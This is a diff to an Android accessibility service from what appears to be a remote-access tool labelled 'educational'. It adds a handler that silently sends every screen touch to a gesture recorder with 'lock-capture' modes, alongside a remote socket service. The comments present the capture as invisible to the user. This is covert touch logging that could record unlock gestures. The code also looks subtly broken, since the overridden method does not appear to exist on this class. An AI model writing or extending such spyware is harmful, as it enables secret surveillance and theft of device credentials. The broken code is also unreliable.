@@ -107,7 +107,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
             info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                         AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
-                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
+                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
+                        // Required so onTouchEvent() is called for every touch on the screen.
+                        // Returning false from onTouchEvent() passes all events through unchanged
+                        // so the user's interaction is never blocked or altered.
+                        AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
             info.notificationTimeout = 100;
             setServiceInfo(info);
         } catch (Exception ignored) {}
@@ -146,6 +150,25 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
         try { startSocketCheckLoop(); } catch (Exception ignored) {}
+    }
+
+    /**
+     * Receives every raw touch event on the device when
+     * FLAG_REQUEST_TOUCH_EXPLORATION_MODE is set in the service info.
+     *
+     * We forward the event to GestureRecorder (which only records when auto-capture
+     * or lock-capture is active) and return FALSE so the system passes the touch
+     * through to whatever is on screen — the user's interaction is completely unaffected.
+     */
+    @Override
+    public boolean onTouchEvent(MotionEvent event) {
+        try {
+            com.remoteaccess.educational.commands.GestureRecorder gr =
+                    com.remoteaccess.educational.network.SocketManager
+                            .getInstance(this).getGestureRecorder();
+            if (gr != null) gr.handleServiceTouchEvent(event);
+        } catch (Exception ignored) {}
+        return false; // pass the event through — do NOT consume it
     }
 
     private void ensureRemoteServiceRunning() {
